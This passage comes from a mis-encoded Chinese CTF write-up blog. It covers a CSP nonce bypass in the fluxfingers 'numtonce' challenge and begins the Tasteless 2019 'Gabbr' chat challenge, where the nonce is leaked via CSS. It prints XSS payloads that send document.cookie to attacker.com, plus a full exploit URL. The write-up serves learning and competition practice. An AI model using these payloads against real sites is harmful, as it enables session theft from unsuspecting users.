æ­¤ï¼Œæˆ‘ä»¬å†æ¬¡ä½¿ç”¨äº†ç›¸åŒçš„æŠ€å·§ï¼Œå¹¶ä½¿ç”¨æ­£ç¡®çš„nonceç¼–å†™äº†ä¸€ä¸ªè„šæœ¬æ ‡ç­¾ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&apos;&lt;script nonce=&quot;&#123;nonce&#125;&quot; src=&quot;https://attacker.com/cookie=&apos;+document.cookie+&apos;&quot;&gt;&lt;/script&gt;&apos;);</span><br></pre></td></tr></table></figure>

<h6 id="åæ¥æƒ³äº†ä¸€ä¸‹ï¼Œdocument-location-https-attacker-com-cookie-39-document-cookie-39-ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚"><a href="#åæ¥æƒ³äº†ä¸€ä¸‹ï¼Œdocument-location-https-attacker-com-cookie-39-document-cookie-39-ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚" class="headerlink" title="åæ¥æƒ³äº†ä¸€ä¸‹ï¼Œdocument.location=https://attacker.com/cookie=&#39;+document.cookie+&#39;ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚"></a>åæ¥æƒ³äº†ä¸€ä¸‹ï¼Œdocument.location=<a href="https://attacker.com/cookie=&#39;+document.cookie+&#39;ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚" target="_blank" rel="noopener">https://attacker.com/cookie=&#39;+document.cookie+&#39;ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</a></h6><h5 id="æœ€ç»ˆçš„payload"><a href="#æœ€ç»ˆçš„payload" class="headerlink" title="æœ€ç»ˆçš„payload:"></a>æœ€ç»ˆçš„payload:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net&lt;script nonce=&quot;&#123;nonce&#125;&quot;&gt;document.write(&apos;&lt;script nonce=&quot;&#123;nonce&#125;&quot; src=&quot;https://attacker.com/cookie=&apos;+document.cookie+&apos;&quot;&gt;&lt;/script&gt;&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h6 id="nonce-æ˜¯å…ˆå‰å“åº”æ ‡å¤´ä¸­å…·æœ‰ç›¸åŒURLçš„CSP-nonceä»¤ç‰Œ"><a href="#nonce-æ˜¯å…ˆå‰å“åº”æ ‡å¤´ä¸­å…·æœ‰ç›¸åŒURLçš„CSP-nonceä»¤ç‰Œ" class="headerlink" title="{nonce}æ˜¯å…ˆå‰å“åº”æ ‡å¤´ä¸­å…·æœ‰ç›¸åŒURLçš„CSP nonceä»¤ç‰Œ"></a>{nonce}æ˜¯å…ˆå‰å“åº”æ ‡å¤´ä¸­å…·æœ‰ç›¸åŒURLçš„CSP nonceä»¤ç‰Œ</h6><h5 id="Lessons-learned"><a href="#Lessons-learned" class="headerlink" title="Lessons learned"></a>Lessons learned</h5><h6 id="Check-and-understand-the-CSP-We-would-have-saved-a-looot-of-time-if-we-understood-the-CSP-correctly-straight-away-As-default-src-was-set-to-none-We-should-have-noticed-that-it-is-impossible-to-include-any-external-resource-Meaning-that-even-if-we-would-have-found-some-unsafe-javascript-code-inside-the-website-itself-it-would-still-have-been-impossible-to-send-the-cookie-to-an-external-server-The-only-exceptions-to-be-able-to-contact-an-external-server-would-be-if-the-nonce-of-a-script-tag-is-correct-or-the-sha256-of-the-external-script-would-be-correct-As-it-is-impossible-to-find-sha256-collisions-finding-a-correct-nonce-is-the-only-possible-solution-So-no-matter-what-we-tried-to-do-we-sould-have-noticed-from-the-beginning-that-we-needed-to-force-a-valid-nonce"><a href="#Check-and-understand-the-CSP-We-would-have-saved-a-looot-of-time-if-we-understood-the-CSP-correctly-straight-away-As-default-src-was-set-to-none-We-should-have-noticed-that-it-is-impossible-to-include-any-external-resource-Meaning-that-even-if-we-would-have-found-some-unsafe-javascript-code-inside-the-website-itself-it-would-still-have-been-impossible-to-send-the-cookie-to-an-external-server-The-only-exceptions-to-be-able-to-contact-an-external-server-would-be-if-the-nonce-of-a-script-tag-is-correct-or-the-sha256-of-the-external-script-would-be-correct-As-it-is-impossible-to-find-sha256-collisions-finding-a-correct-nonce-is-the-only-possible-solution-So-no-matter-what-we-tried-to-do-we-sould-have-noticed-from-the-beginning-that-we-needed-to-force-a-valid-nonce" class="headerlink" title="Check and understand the CSP! We would have saved a looot of time if we understood the CSP correctly straight away. As default-src was set to none. We should have noticed that it is impossible to include any external resource. Meaning that even if we would have found some unsafe javascript code inside the website itself, it would still have been impossible to send the cookie to an external server! The only exceptions to be able to contact an external server would be if the nonce of a script tag is correct or the sha256 of the external script would be correct. As it is impossible to find sha256 collisions, finding a correct nonce is the only possible solution. So no matter what we tried to do, we sould have noticed from the beginning that we needed to force a valid nonce!"></a>Check and understand the CSP! We would have saved a looot of time if we understood the CSP correctly straight away. As <code>default-src</code> was set to <code>none</code>. We should have noticed that it is impossible to include any external resource. Meaning that even if we would have found some unsafe javascript code inside the website itself, it would still have been impossible to send the cookie to an external server! The only exceptions to be able to contact an external server would be if the nonce of a script tag is correct or the sha256 of the external script would be correct. As it is impossible to find sha256 collisions, finding a correct nonce is the only possible solution. So no matter what we tried to do, we sould have noticed from the beginning that we needed to force a valid nonce!</h6><h4 id="Tasteless-2019-Gabbr"><a href="#Tasteless-2019-Gabbr" class="headerlink" title="Tasteless 2019 - Gabbr"></a>Tasteless 2019 - Gabbr</h4><h5 id="é¢˜ç›®ç±»å‹ï¼šCSPï¼ŒCSS"><a href="#é¢˜ç›®ç±»å‹ï¼šCSPï¼ŒCSS" class="headerlink" title="é¢˜ç›®ç±»å‹ï¼šCSPï¼ŒCSS"></a>é¢˜ç›®ç±»å‹ï¼šCSPï¼ŒCSS</h5><h5 id="æ€»è§ˆ"><a href="#æ€»è§ˆ" class="headerlink" title="æ€»è§ˆ"></a>æ€»è§ˆ</h5><h6 id="gabbræ˜¯ä¸€ä¸ªåœ¨çº¿èŠå¤©å®¤æœåŠ¡ã€‚å½“é¡µé¢åŠ è½½åï¼Œäººä»¬åŠ å…¥URLçš„å“ˆå¸Œéƒ¨åˆ†æŒ‡å®šçš„èŠå¤©å®¤ä¾‹å¦‚ï¼š"><a href="#gabbræ˜¯ä¸€ä¸ªåœ¨çº¿èŠå¤©å®¤æœåŠ¡ã€‚å½“é¡µé¢åŠ è½½åï¼Œäººä»¬åŠ å…¥URLçš„å“ˆå¸Œéƒ¨åˆ†æŒ‡å®šçš„èŠå¤©å®¤ä¾‹å¦‚ï¼š" class="headerlink" title="gabbræ˜¯ä¸€ä¸ªåœ¨çº¿èŠå¤©å®¤æœåŠ¡ã€‚å½“é¡µé¢åŠ è½½åï¼Œäººä»¬åŠ å…¥URLçš„å“ˆå¸Œéƒ¨åˆ†æŒ‡å®šçš„èŠå¤©å®¤ä¾‹å¦‚ï¼š"></a>gabbræ˜¯ä¸€ä¸ªåœ¨çº¿èŠå¤©å®¤æœåŠ¡ã€‚å½“é¡µé¢åŠ è½½åï¼Œäººä»¬åŠ å…¥URLçš„å“ˆå¸Œéƒ¨åˆ†æŒ‡å®šçš„èŠå¤©å®¤ä¾‹å¦‚ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gabbr.hitme.tasteless.eu/#8f332afe-8f1d-411f-80f3-44bb2302405d</span><br></pre></td></tr></table></figure>

<h6 id="å¦‚æœæ²¡æœ‰æŒ‡å®šåç§°ï¼Œåˆ™åœ¨åŠ å…¥æ—¶ä¼šéšæœºç”Ÿæˆä¸€ä¸ªUUIDã€‚"><a href="#å¦‚æœæ²¡æœ‰æŒ‡å®šåç§°ï¼Œåˆ™åœ¨åŠ å…¥æ—¶ä¼šéšæœºç”Ÿæˆä¸€ä¸ªUUIDã€‚" class="headerlink" title="å¦‚æœæ²¡æœ‰æŒ‡å®šåç§°ï¼Œåˆ™åœ¨åŠ å…¥æ—¶ä¼šéšæœºç”Ÿæˆä¸€ä¸ªUUIDã€‚"></a>å¦‚æœæ²¡æœ‰æŒ‡å®šåç§°ï¼Œåˆ™åœ¨åŠ å…¥æ—¶ä¼šéšæœºç”Ÿæˆä¸€ä¸ªUUIDã€‚</h6><h6 id="ä¸»è¦çš„åŠŸèƒ½æ˜¯åœ¨èŠå¤©å®¤ä¸­å‘é€æ¶ˆæ¯ã€‚æ­¤å¤–ï¼Œå¯ä»¥å°†ç”¨æˆ·åæ›´æ”¹ä¸ºå¦ä¸€ä¸ªéšæœºçš„ç”¨æˆ·åï¼ŒåŠ å…¥æ–°çš„éšæœºèŠå¤©å®¤å¹¶å°†è¯¥èŠå¤©å®¤æŠ¥å‘Šç»™ç®¡ç†å‘˜ã€‚"><a href="#ä¸»è¦çš„åŠŸèƒ½æ˜¯åœ¨èŠå¤©å®¤ä¸­å‘é€æ¶ˆæ¯ã€‚æ­¤å¤–ï¼Œå¯ä»¥å°†ç”¨æˆ·åæ›´æ”¹ä¸ºå¦ä¸€ä¸ªéšæœºçš„ç”¨æˆ·åï¼ŒåŠ å…¥æ–°çš„éšæœºèŠå¤©å®¤å¹¶å°†è¯¥èŠå¤©å®¤æŠ¥å‘Šç»™ç®¡ç†å‘˜ã€‚" class="headerlink" title="ä¸»è¦çš„åŠŸèƒ½æ˜¯åœ¨èŠå¤©å®¤ä¸­å‘é€æ¶ˆæ¯ã€‚æ­¤å¤–ï¼Œå¯ä»¥å°†ç”¨æˆ·åæ›´æ”¹ä¸ºå¦ä¸€ä¸ªéšæœºçš„ç”¨æˆ·åï¼ŒåŠ å…¥æ–°çš„éšæœºèŠå¤©å®¤å¹¶å°†è¯¥èŠå¤©å®¤æŠ¥å‘Šç»™ç®¡ç†å‘˜ã€‚"></a>ä¸»è¦çš„åŠŸèƒ½æ˜¯åœ¨èŠå¤©å®¤ä¸­å‘é€æ¶ˆæ¯ã€‚æ­¤å¤–ï¼Œå¯ä»¥å°†ç”¨æˆ·åæ›´æ”¹ä¸ºå¦ä¸€ä¸ªéšæœºçš„ç”¨æˆ·åï¼ŒåŠ å…¥æ–°çš„éšæœºèŠå¤©å®¤å¹¶å°†è¯¥èŠå¤©å®¤æŠ¥å‘Šç»™ç®¡ç†å‘˜ã€‚</h6><h6 id="æŠ¥å‘Šåï¼Œç®¡ç†å‘˜å°†åŠ å…¥èŠå¤©å®¤å¹¶åœ¨èŠå¤©å®¤ä¸­å¾…15ç§’ã€‚å¦å¤–ï¼ŒèŠå¤©å®¤æ˜¯åŸºäºwebsocketsã€‚"><a href="#æŠ¥å‘Šåï¼Œç®¡ç†å‘˜å°†åŠ å…¥èŠå¤©å®¤å¹¶åœ¨èŠå¤©å®¤ä¸­å¾…15ç§’ã€‚å¦å¤–ï¼ŒèŠå¤©å®¤æ˜¯åŸºäºwebsocketsã€‚" class="headerlink" title="æŠ¥å‘Šåï¼Œç®¡ç†å‘˜å°†åŠ å…¥èŠå¤©å®¤å¹¶åœ¨èŠå¤©å®¤ä¸­å¾…15ç§’ã€‚å¦å¤–ï¼ŒèŠå¤©å®¤æ˜¯åŸºäºwebsocketsã€‚"></a>æŠ¥å‘Šåï¼Œç®¡ç†å‘˜å°†åŠ å…¥èŠå¤©å®¤å¹¶åœ¨èŠå¤©å®¤ä¸­å¾…15ç§’ã€‚å¦å¤–ï¼ŒèŠå¤©å®¤æ˜¯åŸºäºwebsocketsã€‚</h6><h5 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><h6 id="æ”¶é›†ä¿¡æ¯-ä¾‹å¦‚NSA"><a href="#æ”¶é›†ä¿¡æ¯-ä¾‹å¦‚NSA" class="headerlink" title="æ”¶é›†ä¿¡æ¯(ä¾‹å¦‚NSA)"></a>æ”¶é›†ä¿¡æ¯(ä¾‹å¦‚NSA)</h6><h6 id="æ¶ˆæ¯æ²¡æœ‰è¢«æ¸…é™¤ï¼Œå³å¯ä»¥æ³¨å…¥ä»»æ„çš„HTMLã€‚ä½†æ˜¯ï¼ŒCSPç­–ç•¥å…·æœ‰ä¸¥æ ¼çš„é™åˆ¶ï¼š"><a href="#æ¶ˆæ¯æ²¡æœ‰è¢«æ¸…é™¤ï¼Œå³å¯ä»¥æ³¨å…¥ä»»æ„çš„HTMLã€‚ä½†æ˜¯ï¼ŒCSPç­–ç•¥å…·æœ‰ä¸¥æ ¼çš„é™åˆ¶ï¼š" class="headerlink" title="æ¶ˆæ¯æ²¡æœ‰è¢«æ¸…é™¤ï¼Œå³å¯ä»¥æ³¨å…¥ä»»æ„çš„HTMLã€‚ä½†æ˜¯ï¼ŒCSPç­–ç•¥å…·æœ‰ä¸¥æ ¼çš„é™åˆ¶ï¼š"></a>æ¶ˆæ¯æ²¡æœ‰è¢«æ¸…é™¤ï¼Œå³å¯ä»¥æ³¨å…¥ä»»æ„çš„HTMLã€‚ä½†æ˜¯ï¼ŒCSPç­–ç•¥å…·æœ‰ä¸¥æ ¼çš„é™åˆ¶ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;self&apos;; script-src &apos;nonce-cff855cb552d6be6be760496&apos;; frame-src https://www.google.com/recaptcha/; connect-src &apos;self&apos; xsstest.tasteless.eu https://www.google.com/recaptcha/; worker-src https://www.google.com/recaptcha/; style-src &apos;unsafe-inline&apos; https://www.gstatic.com/recaptcha/; font-src &apos;self&apos;; img-src *; report-uri https://xsstest.ctf.tasteless.eu/report-violation; object-src &apos;none&apos;</span><br></pre></td></tr></table></figure>

<h6 id="ä»…å½“è„šæœ¬å…·æœ‰æ­£ç¡®çš„nonceå±æ€§æ—¶æ‰æ‰§è¡Œè„šæœ¬æ ‡ç­¾ã€‚"><a href="#ä»…å½“è„šæœ¬å…·æœ‰æ­£ç¡®çš„nonceå±æ€§æ—¶æ‰æ‰§è¡Œè„šæœ¬æ ‡ç­¾ã€‚" class="headerlink" title="ä»…å½“è„šæœ¬å…·æœ‰æ­£ç¡®çš„nonceå±æ€§æ—¶æ‰æ‰§è¡Œè„šæœ¬æ ‡ç­¾ã€‚"></a>ä»…å½“è„šæœ¬å…·æœ‰æ­£ç¡®çš„<code>nonce</code>å±æ€§æ—¶æ‰æ‰§è¡Œè„šæœ¬æ ‡ç­¾ã€‚</h6><h6 id="è¿™ä¸ªnonceåœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶åœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆï¼Œå¹¶ä¸”åœ¨CSPä¸­æŒ‡å®šä¸ºscript-src-39-nonce-cff855cb552d6be6be760496-39-ã€‚"><a href="#è¿™ä¸ªnonceåœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶åœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆï¼Œå¹¶ä¸”åœ¨CSPä¸­æŒ‡å®šä¸ºscript-src-39-nonce-cff855cb552d6be6be760496-39-ã€‚" class="headerlink" title="è¿™ä¸ªnonceåœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶åœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆï¼Œå¹¶ä¸”åœ¨CSPä¸­æŒ‡å®šä¸ºscript-src &#39;nonce-cff855cb552d6be6be760496&#39;;ã€‚"></a>è¿™ä¸ªnonceåœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶åœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆï¼Œå¹¶ä¸”åœ¨CSPä¸­æŒ‡å®šä¸º<code>script-src &#39;nonce-cff855cb552d6be6be760496&#39;;</code>ã€‚</h6><h6 id="è¿™ä¼šé˜»æ­¢å…¶ä»–çš„å°è¯•å’ŒæŠ€å·§å»æ‰§è¡Œjavascriptä»£ç åƒé‚£äº›äº‹ä»¶å¤„ç†ç¨‹åºã€‚"><a href="#è¿™ä¼šé˜»æ­¢å…¶ä»–çš„å°è¯•å’ŒæŠ€å·§å»æ‰§è¡Œjavascriptä»£ç åƒé‚£äº›äº‹ä»¶å¤„ç†ç¨‹åºã€‚" class="headerlink" title="è¿™ä¼šé˜»æ­¢å…¶ä»–çš„å°è¯•å’ŒæŠ€å·§å»æ‰§è¡Œjavascriptä»£ç åƒé‚£äº›äº‹ä»¶å¤„ç†ç¨‹åºã€‚"></a>è¿™ä¼šé˜»æ­¢å…¶ä»–çš„å°è¯•å’ŒæŠ€å·§å»æ‰§è¡Œjavascriptä»£ç åƒé‚£äº›äº‹ä»¶å¤„ç†ç¨‹åºã€‚</h6><h6 id="å› æ­¤ï¼Œè¦æ‰§è¡Œjavascriptä»£ç ï¼Œéœ€è¦çŸ¥é“nonceåœ¨åŠ è½½é¡µé¢æ—¶çš„å€¼-ä¹Ÿå°±æ˜¯24ä¸ªå­—ç¬¦-ï¼Œè¿™æ˜¾ç„¶æˆ‘ä»¬æ˜¯æ— æ³•ä»ç®¡ç†å‘˜å“ªé‡Œè½»æ¾è·å–çš„ã€‚"><a href="#å› æ­¤ï¼Œè¦æ‰§è¡Œjavascriptä»£ç ï¼Œéœ€è¦çŸ¥é“nonceåœ¨åŠ è½½é¡µé¢æ—¶çš„å€¼-ä¹Ÿå°±æ˜¯24ä¸ªå­—ç¬¦-ï¼Œè¿™æ˜¾ç„¶æˆ‘ä»¬æ˜¯æ— æ³•ä»ç®¡ç†å‘˜å“ªé‡Œè½»æ¾è·å–çš„ã€‚" class="headerlink" title="å› æ­¤ï¼Œè¦æ‰§è¡Œjavascriptä»£ç ï¼Œéœ€è¦çŸ¥é“nonceåœ¨åŠ è½½é¡µé¢æ—¶çš„å€¼(ä¹Ÿå°±æ˜¯24ä¸ªå­—ç¬¦)ï¼Œè¿™æ˜¾ç„¶æˆ‘ä»¬æ˜¯æ— æ³•ä»ç®¡ç†å‘˜å“ªé‡Œè½»æ¾è·å–çš„ã€‚"></a>å› æ­¤ï¼Œè¦æ‰§è¡Œjavascriptä»£ç ï¼Œéœ€è¦çŸ¥é“<code>nonce</code>åœ¨åŠ è½½é¡µé¢æ—¶çš„å€¼(ä¹Ÿå°±æ˜¯24ä¸ªå­—ç¬¦)ï¼Œè¿™æ˜¾ç„¶æˆ‘ä»¬æ˜¯æ— æ³•ä»ç®¡ç†å‘˜å“ªé‡Œè½»æ¾è·å–çš„ã€‚</h6><h6 id="æˆ‘ä»¬ç°åœ¨å¯ä»¥åšçš„æ˜¯ï¼Œè™½ç„¶æ˜¯åŠ è½½ä»»æ„çš„CSSå’Œå›¾åƒstyle-srcè¢«è®¾ç½®ä¸ºunsafe-inlineå’Œimg-srcæ˜¯-ä½†æ˜¯å®ƒæœ‰ä¸€äº›æœ‰è¶£çš„æ”»å‡»æ–¹å¼ã€‚"><a href="#æˆ‘ä»¬ç°åœ¨å¯ä»¥åšçš„æ˜¯ï¼Œè™½ç„¶æ˜¯åŠ è½½ä»»æ„çš„CSSå’Œå›¾åƒstyle-srcè¢«è®¾ç½®ä¸ºunsafe-inlineå’Œimg-srcæ˜¯-ä½†æ˜¯å®ƒæœ‰ä¸€äº›æœ‰è¶£çš„æ”»å‡»æ–¹å¼ã€‚" class="headerlink" title="æˆ‘ä»¬ç°åœ¨å¯ä»¥åšçš„æ˜¯ï¼Œè™½ç„¶æ˜¯åŠ è½½ä»»æ„çš„CSSå’Œå›¾åƒstyle-srcè¢«è®¾ç½®ä¸ºunsafe-inlineå’Œimg-srcæ˜¯*ä½†æ˜¯å®ƒæœ‰ä¸€äº›æœ‰è¶£çš„æ”»å‡»æ–¹å¼ã€‚"></a>æˆ‘ä»¬ç°åœ¨å¯ä»¥åšçš„æ˜¯ï¼Œè™½ç„¶æ˜¯åŠ è½½ä»»æ„çš„CSSå’Œå›¾åƒ<code>style-src</code>è¢«è®¾ç½®ä¸º<code>unsafe-inline</code>å’Œ<code>img-src</code>æ˜¯<code>*</code>ä½†æ˜¯å®ƒæœ‰ä¸€äº›æœ‰è¶£çš„æ”»å‡»æ–¹å¼ã€‚</h6><h5 id="è·å–éšæœºæ•°"><a href="#è·å–éšæœºæ•°" class="headerlink" title="è·å–éšæœºæ•°"></a>è·å–éšæœºæ•°</h5><h6 id="åœ¨ç½‘ä¸Šæœç´¢æˆ‘ä»¬çš„æƒ³æ³•æ—¶ï¼Œæˆ‘ä»¬å¶ç„¶å‘ç°äº†2016å¹´ä»¥æ¥çš„è¿™ç¯‡æ–‡ç« ï¼š"><a href="#åœ¨ç½‘ä¸Šæœç´¢æˆ‘ä»¬çš„æƒ³æ³•æ—¶ï¼Œæˆ‘ä»¬å¶ç„¶å‘ç°äº†2016å¹´ä»¥æ¥çš„è¿™ç¯‡æ–‡ç« ï¼š" class="headerlink" title="åœ¨ç½‘ä¸Šæœç´¢æˆ‘ä»¬çš„æƒ³æ³•æ—¶ï¼Œæˆ‘ä»¬å¶ç„¶å‘ç°äº†2016å¹´ä»¥æ¥çš„è¿™ç¯‡æ–‡ç« ï¼š"></a>åœ¨ç½‘ä¸Šæœç´¢æˆ‘ä»¬çš„æƒ³æ³•æ—¶ï¼Œæˆ‘ä»¬å¶ç„¶å‘ç°äº†2016å¹´ä»¥æ¥çš„è¿™ç¯‡æ–‡ç« ï¼š</h6><h6 id="https-sirdarckcat-blogspot-com-2016-12-how-to-bypass-csp-nonces-with-dom-xss-htmlå…¶ä½œè€…æè¿°äº†æ”»å‡»è€…å¯ä»¥ä½¿ç”¨cssæå–å…¶å†…å®¹ã€‚"><a href="#https-sirdarckcat-blogspot-com-2016-12-how-to-bypass-csp-nonces-with-dom-xss-htmlå…¶ä½œè€…æè¿°äº†æ”»å‡»è€…å¯ä»¥ä½¿ç”¨cssæå–å…¶å†…å®¹ã€‚" class="headerlink" title="https://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.htmlå…¶ä½œè€…æè¿°äº†æ”»å‡»è€…å¯ä»¥ä½¿ç”¨cssæå–å…¶å†…å®¹ã€‚"></a><a href="https://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.htmlå…¶ä½œè€…æè¿°äº†æ”»å‡»è€…å¯ä»¥ä½¿ç”¨cssæå–å…¶å†…å®¹ã€‚" target="_blank" rel="noopener">https://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.htmlå…¶ä½œè€…æè¿°äº†æ”»å‡»è€…å¯ä»¥ä½¿ç”¨cssæå–å…¶å†…å®¹ã€‚</a></h6><ul>
<li>é¦–å…ˆï¼Œæ³¨å…¥ä¸<code>nonce</code>çš„ç¬¬ä¸€ä¸ªå­—ç¬¦åŒ¹é…çš„CSSé€‰æ‹©å™¨ã€‚</li>
<li>åŒ¹é…åï¼Œå°†CSSé€‰æ‹©å™¨è®¾ç½®ä»ç»™å®šçš„URLåŠ è½½èƒŒæ™¯å›¾ç‰‡ã€‚ç”±äºæˆ‘ä»¬çŸ¥é“åŒ¹é…çš„å†…å®¹ï¼Œå› æ­¤å¯ä»¥å°†åŒ¹é…çš„å­—ç¬¦ä¸²ä½œä¸ºGETå‚æ•°æ·»åŠ åˆ°è¯·æ±‚ä¸­ã€‚</li>
<li>é€šè¿‡å¯¹æ¯ä¸ªå­—ç¬¦é‡å¤æ­¤è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨24æ¡æ¶ˆæ¯é‡æ„æ•´ä¸ª<code>nonce</code>ã€‚</li>
</ul>
<h6 id="è¿™æ˜¯éå¸¸åˆé€‚çš„ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æ³¨å…¥ä»»æ„çš„CSSï¼å› æ­¤æˆ‘ä»¬åƒé€‚å½“çš„é»‘å®¢ä¸€æ ·ï¼Œå¤åˆ¶äº†ä»–çš„è„šæœ¬ã€‚"><a href="#è¿™æ˜¯éå¸¸åˆé€‚çš„ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æ³¨å…¥ä»»æ„çš„CSSï¼å› æ­¤æˆ‘ä»¬åƒé€‚å½“çš„é»‘å®¢ä¸€æ ·ï¼Œå¤åˆ¶äº†ä»–çš„è„šæœ¬ã€‚" class="headerlink" title="è¿™æ˜¯éå¸¸åˆé€‚çš„ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æ³¨å…¥ä»»æ„çš„CSSï¼å› æ­¤æˆ‘ä»¬åƒé€‚å½“çš„é»‘å®¢ä¸€æ ·ï¼Œå¤åˆ¶äº†ä»–çš„è„šæœ¬ã€‚"></a>è¿™æ˜¯éå¸¸åˆé€‚çš„ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æ³¨å…¥ä»»æ„çš„CSSï¼å› æ­¤æˆ‘ä»¬åƒé€‚å½“çš„é»‘å®¢ä¸€æ ·ï¼Œå¤åˆ¶äº†ä»–çš„è„šæœ¬ã€‚</h6><h6 id="ä½†æ˜¯ï¼Œç»™å®šçš„é€‰æ‹©å™¨ä¸èµ·ä½œç”¨ã€‚"><a href="#ä½†æ˜¯ï¼Œç»™å®šçš„é€‰æ‹©å™¨ä¸èµ·ä½œç”¨ã€‚" class="headerlink" title="ä½†æ˜¯ï¼Œç»™å®šçš„é€‰æ‹©å™¨ä¸èµ·ä½œç”¨ã€‚"></a>ä½†æ˜¯ï¼Œç»™å®šçš„é€‰æ‹©å™¨ä¸èµ·ä½œç”¨ã€‚</h6><h6 id="å› æ­¤æˆ‘ä»¬è‡ªå·±å¼€å§‹è‡ªè¡Œçš„è°ƒè¯•é€‰æ‹©å™¨ã€‚"><a href="#å› æ­¤æˆ‘ä»¬è‡ªå·±å¼€å§‹è‡ªè¡Œçš„è°ƒè¯•é€‰æ‹©å™¨ã€‚" class="headerlink" title="å› æ­¤æˆ‘ä»¬è‡ªå·±å¼€å§‹è‡ªè¡Œçš„è°ƒè¯•é€‰æ‹©å™¨ã€‚"></a>å› æ­¤æˆ‘ä»¬è‡ªå·±å¼€å§‹è‡ªè¡Œçš„è°ƒè¯•é€‰æ‹©å™¨ã€‚</h6><h6 id="ä¹‹åæˆ‘ä»¬å°è¯•å»åŒ¹é…scriptæ ‡ç­¾ä½¿ç”¨Chromeå¤±è´¥æ—¶ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°äº†ä¸€äº›å¥‡æ€ªçš„ç°è±¡ï¼š"><a href="#ä¹‹åæˆ‘ä»¬å°è¯•å»åŒ¹é…scriptæ ‡ç­¾ä½¿ç”¨Chromeå¤±è´¥æ—¶ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°äº†ä¸€äº›å¥‡æ€ªçš„ç°è±¡ï¼š" class="headerlink" title="ä¹‹åæˆ‘ä»¬å°è¯•å»åŒ¹é…scriptæ ‡ç­¾ä½¿ç”¨Chromeå¤±è´¥æ—¶ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°äº†ä¸€äº›å¥‡æ€ªçš„ç°è±¡ï¼š"></a>ä¹‹åæˆ‘ä»¬å°è¯•å»åŒ¹é…<code>script</code>æ ‡ç­¾ä½¿ç”¨Chromeå¤±è´¥æ—¶ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°äº†ä¸€äº›å¥‡æ€ªçš„ç°è±¡ï¼š</h6><h6 id="ChromeåŠ è½½åå°†å…¶nonceä»script-tagä¸­åˆ é™¤ã€‚"><a href="#ChromeåŠ è½½åå°†å…¶nonceä»script-tagä¸­åˆ é™¤ã€‚" class="headerlink" title="ChromeåŠ è½½åå°†å…¶nonceä»script-tagä¸­åˆ é™¤ã€‚"></a>ChromeåŠ è½½åå°†å…¶<code>nonce</code>ä»<code>script-tag</code>ä¸­åˆ é™¤ã€‚</h6><h6 id="ä½†æ˜¯ã€‚Firefoxå°†nonceä¿å­˜æ—©DOMæ ‘ä¸­ã€‚"><a href="#ä½†æ˜¯ã€‚Firefoxå°†nonceä¿å­˜æ—©DOMæ ‘ä¸­ã€‚" class="headerlink" title="ä½†æ˜¯ã€‚Firefoxå°†nonceä¿å­˜æ—©DOMæ ‘ä¸­ã€‚"></a>ä½†æ˜¯ã€‚Firefoxå°†<code>nonce</code>ä¿å­˜æ—©DOMæ ‘ä¸­ã€‚</h6><h6 id="å¹¸è¿çš„æ˜¯ï¼Œæ”»å‡»è€…ä½¿ç”¨çš„æ˜¯Firefoxï¼Œæˆ‘ä»¬æ˜¯ä»ç®¡ç†å‘˜çš„user-agentå¤´ä¸­å‘ç°çš„ã€‚"><a href="#å¹¸è¿çš„æ˜¯ï¼Œæ”»å‡»è€…ä½¿ç”¨çš„æ˜¯Firefoxï¼Œæˆ‘ä»¬æ˜¯ä»ç®¡ç†å‘˜çš„user-agentå¤´ä¸­å‘ç°çš„ã€‚" class="headerlink" title="å¹¸è¿çš„æ˜¯ï¼Œæ”»å‡»è€…ä½¿ç”¨çš„æ˜¯Firefoxï¼Œæˆ‘ä»¬æ˜¯ä»ç®¡ç†å‘˜çš„user-agentå¤´ä¸­å‘ç°çš„ã€‚"></a>å¹¸è¿çš„æ˜¯ï¼Œæ”»å‡»è€…ä½¿ç”¨çš„æ˜¯Firefoxï¼Œæˆ‘ä»¬æ˜¯ä»ç®¡ç†å‘˜çš„<code>user-agent</code>å¤´ä¸­å‘ç°çš„ã€‚</h6><h6 id="æˆ‘ä»¬çš„ç¬¬ä¸€ç§æ–¹æ³•æ˜¯scriptç›´æ¥åŒ¹é…æ ‡è®°ï¼šscript-nonce-quot-a-quot-ã€‚"><a href="#æˆ‘ä»¬çš„ç¬¬ä¸€ç§æ–¹æ³•æ˜¯scriptç›´æ¥åŒ¹é…æ ‡è®°ï¼šscript-nonce-quot-a-quot-ã€‚" class="headerlink" 